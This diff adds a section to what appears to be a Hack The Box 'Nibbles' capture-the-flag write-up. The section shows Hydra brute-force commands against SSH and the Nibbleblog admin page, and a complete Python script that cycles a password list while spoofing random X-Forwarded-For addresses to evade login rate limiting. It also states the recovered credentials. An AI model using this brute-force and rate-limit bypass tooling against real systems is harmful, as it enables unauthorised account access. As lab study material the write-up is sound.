@@ -107,6 +107,85 @@ Next up, visitng http://nibbles.htb/nibbleblog/update.php, we are able to find a
 
 ![config.xml file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nibbles/config_xml.PNG)
 
+Together with the username, we will attempt to bruteforce the password to the SSH terminal using Hydra. Howeber, it seems that we are unable to bruteforce the login.
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ hydra -l admin -P rockyou.txt 10.10.10.75 -t 4 ssh
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-02 11:26:53
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 602043 login tries (l:1/p:602043), ~150511 tries per task
+[DATA] attacking ssh://10.10.10.75:22/
+[STATUS] 28.00 tries/min, 28 tries in 00:01h, 602015 to do in 358:21h, 4 active
+```
+
+Since the bruteforce to login to the SSH terminal failed, we will try to bruteforce a login to the admin panel on the webpage. However, there is a problem as we soon realize that if there is too many consecutive failed logins, our IP address will be blacklisted for a short period of time. 
+
+```
+sudo hydra -l admin -P rockyou.txt nibbles.htb http-post-form "/nibbleblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."
+```
+
+However, we realize that we can add in a ```X-Forwarded-For``` header to bypass the rate-limiting protection mechanism. To bruteforce the login page, we will write our own script to find the password. From the output, we have obtained that the username-password pair is admin-nibbles.
+
+```python
+import random
+import requests
+import argparse
+import time
+
+def genRandIP():
+	return '.'.join('%s'%random.randint(0, 255) for i in range(4))
+
+def readPasswordList(passwordFileLocation):
+	passwordList = []
+	passwordFile = open(passwordFileLocation,'r')
+	for x in passwordFile.readlines():
+		passwordList.append(x.strip())
+	passwordFile.close()
+	return passwordList
+
+def login(username, password, ip, url):
+	headers = {'X-Forwarded-For': ip}
+	payload = {'username': username, 'password': password}
+	r = requests.post(
+		url, headers=headers,data=payload
+	)
+	if r.status_code == 500:
+		print(ip + "(" + password +"): "+ "Internal server error!")
+		return False
+	if "Incorrect username or password." in r.text:
+		print(ip + "(" + password + "): "+ "Incorrect credentials!")
+		return False
+	if "blacklist" in r.text:
+		print(ip + "(" + password + "):" + "Rate-limiting mechanism in place! Sleeping for 5mins....")
+		time.sleep(300)
+		return False
+	else:
+		print(ip + "(" + password + "): " + "Credentials found")
+		return True
+
+def run(passwordFileLocation,url,position):
+	passwords = readPasswordList(passwordFileLocation)
+	passwords = passwords[int(position):]
+	username = "admin"
+	for password in passwords:
+		randomIP = genRandIP()
+		testLogin = login(username,password,randomIP,url)
+		if testLogin == True:
+			print("Password is: " + str(password))
+			return
+		else:
+			continue
+
+if __name__ == '__main__':
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-u', help='url')
+	parser.add_argument('-w', help='File location')
+	parser.add_argument('-p', help='Position on password list')
+	args = parser.parse_args()
+	run(args.w, args.u, args.p)
+```
 
 ## Obtaining user flag
 
